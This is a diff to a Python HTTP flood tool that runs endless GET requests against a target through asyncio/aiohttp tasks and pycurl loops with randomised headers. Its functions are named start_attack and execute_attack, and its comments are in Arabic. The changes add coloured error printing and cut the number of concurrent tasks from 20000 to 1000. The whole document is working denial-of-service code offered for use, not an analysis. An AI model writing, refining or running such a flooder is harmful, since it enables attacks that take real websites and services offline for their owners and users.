@@ -3,7 +3,6 @@ import aiohttp
 import asyncio
 import pycurl
 from colorama import Fore, Style
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from io import BytesIO
 import random
 
@@ -92,8 +91,10 @@ async def send_requests_aiohttp(target):
                 headers = get_random_headers()
                 async with session.get(target, headers=headers, timeout=5) as response:
                     await response.text()
-            except aiohttp.ClientError:
-                pass
+            except aiohttp.ClientError as e:
+                print(Fore.RED + f"Error in aiohttp request: {e}" + Style.RESET_ALL)
+            except Exception as e:
+                print(Fore.RED + f"Unexpected error in aiohttp: {e}" + Style.RESET_ALL)
 
 def send_requests_pycurl(target):
     while not stop_attack_flag:
@@ -105,8 +106,10 @@ def send_requests_pycurl(target):
         c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
         try:
             c.perform()
-        except pycurl.error:
-            pass
+        except pycurl.error as e:
+            print(Fore.RED + f"Error in pycurl request: {e}" + Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.RED + f"Unexpected error in pycurl: {e}" + Style.RESET_ALL)
         finally:
             c.close()
 
@@ -117,7 +120,7 @@ def start_attack():
         print("Attack will continue indefinitely. Type 'stop' to end it.")
         execute_attack(target)
     except Exception as e:
-        print(f"Error: {str(e)}")
+        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)
 
 def execute_attack(target):
     global stop_attack_flag
@@ -128,7 +131,7 @@ def execute_attack(target):
         # استخدام asyncio للبرمجة غير المتزامنة
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        tasks = [send_requests_aiohttp(target) for _ in range(20000)]  # زيادة عدد المهام
+        tasks = [send_requests_aiohttp(target) for _ in range(1000)]  # زيادة عدد المهام
         loop.run_until_complete(asyncio.gather(*tasks))
 
         # استخدام pycurl
@@ -141,13 +144,13 @@ def execute_attack(target):
         print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
 
     except Exception as e:
-        print(f"Error during attack: {str(e)}")
+        print(Fore.RED + f"Error during attack: {str(e)}" + Style.RESET_ALL)
 
 def main():
     try:
         start_attack()
     except Exception as e:
-        print(f"Error: {str(e)}")
+        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)
 
 if __name__ == "__main__":
     main()
